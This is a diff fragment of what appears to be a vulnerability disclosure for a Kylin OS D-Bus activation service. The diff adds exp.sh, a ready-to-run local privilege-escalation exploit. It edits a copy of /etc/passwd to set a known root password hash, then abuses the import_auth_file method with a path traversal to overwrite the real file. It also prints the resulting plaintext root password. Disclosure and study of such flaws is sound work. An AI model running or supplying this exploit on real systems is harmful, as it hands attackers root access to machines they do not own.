@@ -22,7 +22,14 @@ https://distro-images.kylinos.cn:8802/web_pungi/download/share/HXDYtGjZm3daA4UvO
 
 exp.sh
 ```
-Temporarily closed
+echo "[*] Trying to overwrite passwd file ..."
+cp /etc/passwd /tmp/passwd
+sed -i 's/root:x:0:0:root/root:\$1\$nrDGqnHa\$EhGl0D2EBPmnQTC2hGvgl.:0:0:root/g' /tmp/passwd
+dbus-send --system --dest=org.freedesktop.activation /org/freedesktop/activation org.freedesktop.activation.interface.import_auth_file string:../tmp/passwd
+sleep 1
+dbus-send --system --dest=org.freedesktop.activation /org/freedesktop/activation org.freedesktop.activation.interface.import_auth_file string:../tmp/passwd
+sleep 1
+echo '[*] Try login with root / 123qwe!@#QWE'
 ```
 ### Vuln details
 org.freedesktop.activation::import_auth_file receive files
